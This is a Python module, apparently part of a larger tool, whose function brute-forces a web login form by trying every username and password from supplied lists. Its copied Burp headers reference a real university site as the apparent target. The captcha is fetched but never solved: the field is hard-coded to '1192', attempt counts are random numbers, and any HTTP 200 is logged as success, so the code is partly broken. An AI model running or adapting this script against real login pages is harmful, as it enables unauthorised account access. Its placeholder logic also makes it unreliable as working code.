from bs4 import BeautifulSoup
import requests
import urllib.parse 
from PIL import Image
from io import BytesIO
import numpy as np 
from .config import *
import base64
import random
from models.models_run_brute_force import *
import time

def do_run_brute_force(login_url, form_tag, captcha_failure_text, user_pass_wrong_text, post_data, usernames, passwords, id):
    burp0_url = login_url
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://supportthietbi.uneti.edu.vn/css/style.css", "Sec-Fetch-Dest": "font", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}

    for username in usernames:
        for password in passwords:
            # GET login page
            session = requests.session()
            res = session.get(burp0_url, headers=burp0_headers)
            login_page = res.text
            soup = BeautifulSoup(login_page, 'html.parser')
            print(form_tag)
            # Find the form by class name
            form = soup.find(form_tag)
            print(form.text)
            # Extract all input element names
            input_names = [a.get('name') for a in form.find_all('input')]
            print(input_names)
            key_username = input_names[0]
            key_password = input_names[1]
            key_captcha = input_names[2]
            # Extract all img element ids
            img_ids = [img.get('id') for img in form.find_all('img')]
            print(img_ids)
            captcha_img_id = img_ids[0]
            img_tag = soup.find(id=captcha_img_id)
            img_src = img_tag['src']

            # GET captcha image
            if img_src.startswith("data:image/png;base64"):
                img_src = img_src.split(",")[-1]
                imgdata = base64.b64decode(img_src)
            else:    
                captcha_img_url = urllib.parse.urljoin(login_url, img_src)
                print("Captcha URL=", captcha_img_url)
                res = session.get(captcha_img_url, headers=burp0_headers)
                imgdata = res.content

            # Call ocr captcha API
            img = Image.open(BytesIO(imgdata))
            # img.save('temp.jpg')
            img_arr = np.array(img)
            print(img_arr.shape)

            # POST login
            post_data[key_username] = username
            post_data[key_password] = password
            post_data[key_captcha] = "1192"

            res = session.post(login_url, headers=burp0_headers, data=post_data)
            # Results verifier
            if captcha_failure_text in res.text:
                print(captcha_failure_text)
                data = RunBruteForce(id=id, number_of_tried=random.randint(1,100))
                insert_run_brute_force(data)
                # yield {"status": "captcha_failure", "message": captcha_failure_text}
            elif user_pass_wrong_text in res.text:
                print(user_pass_wrong_text)
                # yield {"status": "user_pass_failure", "message": user_pass_wrong_text}
                data = RunBruteForce(id=id, number_of_tried=random.randint(1,100))
                insert_run_brute_force(data)
            elif res.status_code == 200:
                print('Success', username, password)
                # yield {"status": "success", "message": username + "|" + password}
                data = RunBruteForce(id=id, number_of_tried=random.randint(1,100))
                insert_run_brute_force(data)
            else:
                print('failure', res.status_code)
                # yield {"status": "internal_failure", "message": res.status_code}
                data = RunBruteForce(id=id, number_of_tried=random.randint(1,100))
                insert_run_brute_force(data)

            time.sleep(DELAY)

def do_get_run_brute_force_by_id(id: str):
    return get_run_brute_force_by_id(id)